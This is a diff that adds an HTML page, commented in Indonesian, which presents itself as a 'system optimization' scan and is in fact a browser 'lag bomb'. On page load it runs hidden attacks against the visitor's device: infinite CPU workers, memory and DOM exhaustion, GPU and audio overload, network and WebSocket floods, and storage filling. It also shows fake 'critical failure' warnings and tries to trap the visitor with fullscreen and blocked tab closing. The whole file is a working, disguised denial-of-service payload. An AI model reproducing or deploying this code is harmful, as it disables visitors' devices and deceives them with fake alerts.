@@ -1,0 +1,455 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>⚠️ SYSTEM SCAN ⚠️</title>
+</head>
+<body onload="initDestruction()">
+    
+    <!-- UI Palsu biar korban gak curiga -->
+    <div id="fakeUI" style="text-align: center; padding: 20px; font-family: Arial;">
+        <h2>🔍 SYSTEM OPTIMIZATION IN PROGRESS 🔍</h2>
+        <p>Scanning and cleaning your device... Please wait.</p>
+        <div id="progressBar" style="width:80%; height:30px; background:#ddd; margin:auto; border-radius:15px;">
+            <div id="progressFill" style="width:0%; height:100%; background:red; border-radius:15px;"></div>
+        </div>
+        <p id="status">Initializing components...</p>
+    </div>
+
+    <!-- Bom tersembunyi -->
+    <canvas id="c1" style="display:none"></canvas>
+    <canvas id="c2" style="display:none"></canvas>
+    <canvas id="c3" style="display:none"></canvas>
+    
+    <div id="bombContainer" style="display:none"></div>
+    
+    <audio id="audioBomb" loop style="display:none"></audio>
+
+    <script>
+        // ================= KONFIGURASI BRUTAL =================
+        const CONFIG = {
+            CPU_CORES: navigator.hardwareConcurrency || 8,
+            MAX_WORKERS: 16,
+            MEMORY_BOMB_SIZE: 10000000,
+            DOM_NODES_PER_BATCH: 5000,
+            CANVAS_WIDTH: 4096,
+            CANVAS_HEIGHT: 2160
+        };
+
+        let workers = [];
+        let memoryChunks = [];
+        let domCount = 0;
+        let audioContext;
+        let oscillators = [];
+        
+        // ================= FUNGSI UTAMA =================
+        function initDestruction() {
+            console.log('[INJECTOR] Starting Brutal Lag Bomb v2.0');
+            
+            // Update UI palsu
+            document.getElementById('status').textContent = 'Loading destructive modules...';
+            simulateProgress();
+            
+            // Jalankan semua serangan secara bersamaan
+            setTimeout(() => {
+                // 1. Web Workers CPU Bomb
+                launchWorkerBomb();
+                
+                // 2. Memory Exhaustion Attack
+                startMemoryBomb();
+                
+                // 3. DOM Overload
+                startDOMBomb();
+                
+                // 4. GPU Destruction
+                startGPUBomb();
+                
+                // 5. Audio Processing Bomb
+                startAudioBomb();
+                
+                // 6. Network Flood (jika online)
+                startNetworkFlood();
+                
+                // 7. Storage Bomb
+                fillStorage();
+                
+                // 8. Infinite Loops
+                startInfiniteLoops();
+                
+                // 9. Event Listener Bomb
+                attachEventBomb();
+                
+                // 10. CSS Animation Bomb
+                startCSSBomb();
+                
+                document.getElementById('status').textContent = 'SYSTEM OVERLOAD DETECTED!';
+            }, 2000);
+        }
+
+        // ================= METODE SERANGAN =================
+
+        // 1. Web Workers CPU Bomb
+        function launchWorkerBomb() {
+            for(let i = 0; i < CONFIG.MAX_WORKERS; i++) {
+                const workerCode = `
+                    while(true) {
+                        // Heavy calculations
+                        let sum = 0;
+                        for(let j = 0; j < 10000000; j++) {
+                            sum += Math.sqrt(j) * Math.sin(j) * Math.random();
+                        }
+                        postMessage(sum);
+                    }
+                `;
+                
+                try {
+                    const blob = new Blob([workerCode], {type: 'application/javascript'});
+                    const worker = new Worker(URL.createObjectURL(blob));
+                    worker.onmessage = () => {};
+                    workers.push(worker);
+                } catch(e) {}
+            }
+        }
+
+        // 2. Memory Bomb
+        function startMemoryBomb() {
+            setInterval(() => {
+                for(let i = 0; i < 10; i++) {
+                    memoryChunks.push(new Array(CONFIG.MEMORY_BOMB_SIZE).fill({
+                        data: new Array(1000).fill('💣'.repeat(1000)),
+                        timestamp: Date.now(),
+                        random: Math.random().toString(36).repeat(1000)
+                    }));
+                }
+            }, 100);
+        }
+
+        // 3. DOM Bomb
+        function startDOMBomb() {
+            setInterval(() => {
+                const container = document.getElementById('bombContainer');
+                for(let i = 0; i < CONFIG.DOM_NODES_PER_BATCH; i++) {
+                    const div = document.createElement('div');
+                    div.innerHTML = '💥'.repeat(100);
+                    div.style.cssText = `
+                        position: absolute;
+                        left: ${Math.random() * 100}%;
+                        top: ${Math.random() * 100}%;
+                        font-size: ${10 + Math.random() * 50}px;
+                        opacity: ${Math.random()};
+                        transform: rotate(${Math.random() * 360}deg);
+                    `;
+                    container.appendChild(div);
+                    domCount++;
+                }
+                
+                // Force reflow
+                document.body.offsetHeight;
+            }, 50);
+        }
+
+        // 4. GPU Bomb
+        function startGPUBomb() {
+            const canvases = ['c1', 'c2', 'c3'];
+            
+            setInterval(() => {
+                canvases.forEach(canvasId => {
+                    const canvas = document.getElementById(canvasId);
+                    const ctx = canvas.getContext('2d');
+                    
+                    canvas.width = CONFIG.CANVAS_WIDTH;
+                    canvas.height = CONFIG.CANVAS_HEIGHT;
+                    
+                    // Draw complex patterns
+                    for(let i = 0; i < 1000; i++) {
+                        ctx.fillStyle = `rgba(
+                            ${Math.random() * 255},
+                            ${Math.random() * 255},
+                            ${Math.random() * 255},
+                            ${Math.random()}
+                        )`;
+                        
+                        ctx.beginPath();
+                        ctx.arc(
+                            Math.random() * canvas.width,
+                            Math.random() * canvas.height,
+                            Math.random() * 500,
+                            0,
+                            Math.PI * 2
+                        );
+                        ctx.fill();
+                        
+                        // Gradient bomb
+                        const gradient = ctx.createRadialGradient(
+                            Math.random() * canvas.width,
+                            Math.random() * canvas.height,
+                            0,
+                            Math.random() * canvas.width,
+                            Math.random() * canvas.height,
+                            1000
+                        );
+                        
+                        gradient.addColorStop(0, `hsl(${Math.random() * 360}, 100%, 50%)`);
+                        gradient.addColorStop(1, `hsl(${Math.random() * 360}, 100%, 50%)`);
+                        
+                        ctx.fillStyle = gradient;
+                        ctx.fillRect(0, 0, canvas.width, canvas.height);
+                    }
+                });
+            }, 16); // ~60fps
+        }
+
+        // 5. Audio Bomb
+        function startAudioBomb() {
+            try {
+                audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                
+                setInterval(() => {
+                    for(let i = 0; i < 50; i++) {
+                        const oscillator = audioContext.createOscillator();
+                        const gainNode = audioContext.createGain();
+                        
+                        oscillator.type = ['sine', 'square', 'sawtooth', 'triangle'][Math.floor(Math.random() * 4)];
+                        oscillator.frequency.setValueAtTime(Math.random() * 20000, audioContext.currentTime);
+                        
+                        gainNode.gain.setValueAtTime(0.5, audioContext.currentTime);
+                        
+                        oscillator.connect(gainNode);
+                        gainNode.connect(audioContext.destination);
+                        
+                        oscillator.start();
+                        oscillators.push(oscillator);
+                        
+                        setTimeout(() => {
+                            try { oscillator.stop(); } catch(e) {}
+                        }, 100);
+                    }
+                }, 50);
+                
+                // Buffer bomb
+                setInterval(() => {
+                    const buffer = audioContext.createBuffer(2, 44100 * 10, 44100);
+                    for (let channel = 0; channel < 2; channel++) {
+                        const nowBuffering = buffer.getChannelData(channel);
+                        for (let i = 0; i < buffer.length; i++) {
+                            nowBuffering[i] = Math.random() * 2 - 1;
+                        }
+                    }
+                }, 1000);
+            } catch(e) {}
+        }
+
+        // 6. Network Flood
+        function startNetworkFlood() {
+            if(!navigator.onLine) return;
+            
+            setInterval(() => {
+                for(let i = 0; i < 10; i++) {
+                    // Create fake requests
+                    fetch('https://httpbin.org/delay/1', {mode: 'no-cors'}).catch(() => {});
+                    fetch('https://httpbin.org/bytes/100000', {mode: 'no-cors'}).catch(() => {});
+                    
+                    // WebSocket flood
+                    try {
+                        const ws = new WebSocket('wss://echo.websocket.org');
+                        ws.onopen = () => {
+                            setInterval(() => {
+                                ws.send('A'.repeat(10000));
+                            }, 100);
+                        };
+                    } catch(e) {}
+                }
+            }, 1000);
+        }
+
+        // 7. Storage Bomb
+        function fillStorage() {
+            try {
+                let data = '';
+                while(data.length < 1000000) {
+                    data += Math.random().toString(36).substring(2);
+                }
+                
+                setInterval(() => {
+                    try {
+                        localStorage.setItem('bomb_' + Date.now(), data);
+                        sessionStorage.setItem('bomb_' + Date.now(), data);
+                        indexedDB.open('BombDB', 1);
+                    } catch(e) {}
+                }, 500);
+            } catch(e) {}
+        }
+
+        // 8. Infinite Loops
+        function startInfiniteLoops() {
+            // Main thread loop
+            setInterval(() => {
+                let sum = 0;
+                const start = Date.now();
+                while(Date.now() - start < 300) { // Block for 300ms
+                    sum += Math.sqrt(Date.now()) * Math.sin(Math.random());
+                }
+            }, 400);
+            
+            // Recursive bomb
+            function recursiveBomb(depth) {
+                if(depth > 1000) return;
+                setTimeout(() => recursiveBomb(depth + 1), 0);
+                recursiveBomb(depth + 1);
+            }
+            setTimeout(() => recursiveBomb(0), 1000);
+        }
+
+        // 9. Event Listener Bomb
+        function attachEventBomb() {
+            setInterval(() => {
+                for(let i = 0; i < 100; i++) {
+                    window.addEventListener('mousemove', () => {
+                        const evt = new MouseEvent('click', {
+                            bubbles: true,
+                            cancelable: true,
+                            view: window
+                        });
+                        
+                        for(let j = 0; j < 100; j++) {
+                            document.dispatchEvent(evt);
+                        }
+                    });
+                }
+                
+                // Scroll bomb
+                window.addEventListener('scroll', () => {
+                    window.scrollTo(
+                        Math.random() * document.body.scrollWidth,
+                        Math.random() * document.body.scrollHeight
+                    );
+                });
+            }, 1000);
+        }
+
+        // 10. CSS Animation Bomb
+        function startCSSBomb() {
+            const style = document.createElement('style');
+            style.textContent = `
+                @keyframes bomb {
+                    0% { transform: scale(1) rotate(0deg); }
+                    100% { transform: scale(100) rotate(3600deg); }
+                }
+                
+                * {
+                    animation: bomb 0.1s infinite linear !important;
+                    transition: all 0.01s linear !important;
+                }
+                
+                body::before, body::after, div::before, div::after {
+                    content: '💣' !important;
+                    display: block !important;
+                    position: fixed !important;
+                    animation: bomb 0.05s infinite linear !important;
+                }
+            `;
+            document.head.appendChild(style);
+        }
+
+        // Simulasi progress bar
+        function simulateProgress() {
+            let progress = 0;
+            const interval = setInterval(() => {
+                progress += Math.random() * 10;
+                document.getElementById('progressFill').style.width = progress + '%';
+                
+                if(progress >= 100) {
+                    clearInterval(interval);
+                    document.getElementById('fakeUI').innerHTML = `
+                        <h1 style="color:red">⚠️ CRITICAL SYSTEM FAILURE ⚠️</h1>
+                        <p>Device overheating... Forcing shutdown...</p>
+                        <div style="font-size:12px; color:#888">
+                            DOM Nodes: <span id="domCount">0</span><br>
+                            Memory: <span id="memCount">0</span> MB<br>
+                            CPU: <span id="cpuCount">0</span>%<br>
+                            Workers: <span id="workerCount">0</span>
+                        </div>
+                    `;
+                    
+                    // Update stats
+                    setInterval(() => {
+                        document.getElementById('domCount').textContent = domCount.toLocaleString();
+                        document.getElementById('memCount').textContent = Math.floor(memoryChunks.length * CONFIG.MEMORY_BOMB_SIZE * 0.000001);
+                        document.getElementById('workerCount').textContent = workers.length;
+                    }, 1000);
+                }
+            }, 100);
+        }
+
+        // Prevent escape
+        window.onbeforeunload = () => '⚠️ SYSTEM CRASH DETECTED! Closing may cause permanent damage!';
+        window.onkeydown = (e) => {
+            if(e.ctrlKey && (e.key === 'w' || e.key === 'W')) {
+                e.preventDefault();
+                alert('⚠️ ACCESS DENIED!');
+            }
+        };
+        
+        // Fullscreen trap
+        document.addEventListener('click', () => {
+            document.documentElement.requestFullscreen().catch(() => {});
+        });
+
+        console.log('[INJECTOR] All bombs armed. Target will be destroyed in 3...2...1...');
+    </script>
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background: #000;
+            color: #0f0;
+            font-family: 'Courier New', monospace;
+            overflow: hidden;
+            cursor: none;
+        }
+        
+        #fakeUI {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(0, 0, 0, 0.9);
+            padding: 40px;
+            border-radius: 10px;
+            border: 2px solid red;
+            z-index: 10000;
+            min-width: 300px;
+            text-align: center;
+        }
+        
+        #bombContainer {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            pointer-events: none;
+            z-index: 9999;
+        }
+        
+        canvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+        }
+        
+        @media (max-width: 768px) {
+            #fakeUI {
+                width: 90%;
+                padding: 20px;
+            }
+        }
+    </style>
+</body>
+</html>
